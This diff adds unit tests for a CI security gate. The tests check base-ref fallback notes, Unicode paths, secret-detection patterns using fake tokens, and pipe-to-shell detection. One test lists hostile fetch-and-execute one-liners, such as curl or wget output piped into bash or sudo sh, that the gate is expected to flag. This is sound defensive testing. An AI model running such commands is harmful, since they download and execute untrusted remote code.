@@ -114,6 +114,24 @@ class Verdict(Base):
             self.assertEqual(v["base"], r.base[:7])  # HEAD~1
         self.assertEqual(r.run(only="security", base="HEAD")["base"], r.g("rev-parse", "HEAD").strip()[:7])
 
+    def test_base_note(self):
+        r = self.repo()
+        r.write("a.txt", "x\n")
+        r.commit("a")
+        v = r.run(base="nope")
+        self.assertIn("--base nope does not resolve", v["base_note"])
+        self.assertEqual(v["base"], r.base[:7])  # fell back to HEAD~1
+        self.assertNotIn("base_note", r.run())  # explicit, resolvable base: no note
+        out = io.StringIO()
+        summ = os.path.join(r.root, "s.md")
+        with contextlib.redirect_stdout(out):
+            gate.main(["--base", "nope", "--no-record", "--summary", summ], root=r.root)
+        self.assertIn("base-fallback: --base nope", out.getvalue())
+        with open(summ, encoding="utf-8") as fh:
+            self.assertIn("base-fallback: --base nope", fh.read())
+        self.assertIn("all zeros", r.run(base="0" * 40)["base_note"])
+        self.assertEqual(r.run(base="nope")["verdict"], "pass")  # a note is not a failure
+
     def test_no_base_skips_diff_checks(self):
         r = self.repo()  # a single commit: no HEAD~1
         v = gate.run_gate(r.root, None, {"protected", "review", "security"})
@@ -416,6 +434,47 @@ class Security(Base):
         self.assertEqual(self.added("scripts/i.sh", "curl -fsSL https://x.test/i -o i.sh\n")["status"], "pass")
         self.assertEqual(self.added("docs/x.md", "never run curl x | sh\n")["status"], "pass")
 
+    def test_paths_with_unicode_spaces_and_plus_content(self):
+        for rel in ("app/caf\u00e9.py", "app/with space.py", "app/we\"ird.py"):
+            self.assertEqual(self.added(rel, "k = '%s'\n" % AWS)["codes"], ["secret-in-diff"], rel)
+        c = self.added("app/a.py", "x\n++ x\nk = '%s'\n" % AWS)  # a content line "++ x" shows up as "+++ x"
+        self.assertEqual((c["codes"], c["detail"]), (["secret-in-diff"], "secret-in-diff app/a.py:3"))
+        lines = gate.added_lines("diff --git a/f b/f\n--- a/f\n+++ b/f\t\n@@ -0,0 +1,2 @@\n+++ b/evil\n+k\n")
+        self.assertEqual(lines, [("f", 1, "++ b/evil"), ("f", 2, "k")])
+
+    def test_protected_path_with_unicode_name(self):
+        r = self.repo()
+        r.write("tests/acceptance/caf\u00e9/t.py", "x\n")
+        r.commit("sneak")
+        c = r.check("protected")
+        self.assertEqual(c["codes"], ["protected-path"])
+
+    def test_more_secret_shapes(self):
+        tok = "a1B2" * 7
+        for rel, text in (("a.py", 'GITHUB_TOKEN = "%s"\n' % tok), ("a.py", 'OPENAI_API_KEY="%s"\n' % tok),
+                          ("a.yml", "api_key: %s\n" % tok), ("prod.env", "API_KEY=%s\n" % tok),
+                          ("a.py", "k = 'sk_" + "live_" + "a" * 20 + "'\n"), ("a.py", "k = 'rk_" + "live_" + "a" * 20 + "'\n"),
+                          ("a.py", "k = 'sk-" + "proj-" + "a1" * 12 + "'\n"), ("a.py", "k = 'sk-" + "A1" * 20 + "'\n"),
+                          ("a.py", 'password = "hunter2hunter"\n'), ("a.json", '{"secret": "Abcd1234efgh"}\n'),
+                          ("a.py", "x_AKIA" + "A" * 16 + "_y\n")):
+            self.assertEqual(self.added(rel, text)["codes"], ["secret-in-diff"], (rel, text))
+
+    def test_more_non_secrets(self):
+        for rel, text in (("a.js", 'const token = "some.long.i18n.translation.key"\n'),
+                          ("a.py", "password = process.env.DB_PASSWORD\n"), ("a.py", "token = get_token_value2(x)\n"),
+                          ("a.yml", "api_key: ${API_KEY_FROM_CI_SECRETS_STORE}\n"), ("prod.env", "API_KEY=<paste-your-key-here-1234>\n"),
+                          ("prod.env", "API_KEY=$OTHER_VARIABLE_NAME_1234567\n"), ("a.py", 'password = "changeme123"\n'),
+                          ("a.py", 'password = "xxxxxxxxxxxx"\n'), ("a.py", 'secret = "my-secret-name"\n'),
+                          ("a.py", "token = os.environ.get('GITHUB_TOKEN_NAME_X')\n"), ("a.py", "token = self.next_token_value1\n")):
+            self.assertEqual(self.added(rel, text)["status"], "pass", (rel, text))
+
+    def test_more_pipe_to_shell(self):
+        for text in ("bash <(curl -fsSL https://x.test/i)\n", 'sh -c "$(curl -fsSL https://x.test/i)"\n',
+                     "wget -qO- https://x.test/i | bash\n", "curl -fsSL https://x.test/i | sudo sh\n",
+                     "curl -fsSL https://x.test/i | sudo -E bash -s\n", 'eval "$(curl -fsSL https://x.test/i)"\n'):
+            self.assertEqual(self.added("scripts/i.sh", text)["codes"], ["pipe-to-shell"], text)
+        self.assertEqual(self.added("scripts/i.sh", 'x="$(curl -fsSL https://x.test/i)"\n')["status"], "pass")
+
     def test_working_tree_changes_count(self):
         r = self.repo()
         r.write("a.txt", "x\n")
@@ -536,7 +595,7 @@ class CiWiring(unittest.TestCase):
         self.assertNotIn("metrics.py test", code)
         self.assertLess(code.index("scripts/gate.py"), code.index("scripts/ci_runs.py"))
         self.assertLess(code.index("scripts/ci_runs.py"), code.index("scripts/dashboard.py"))
-        self.assertEqual(code.count("if: always()"), 2)
+        self.assertEqual(code.count("if: always()"), 3)
 
     def test_no_eval_step(self):
         self.assertNotRegex(self.ci, r"evals")
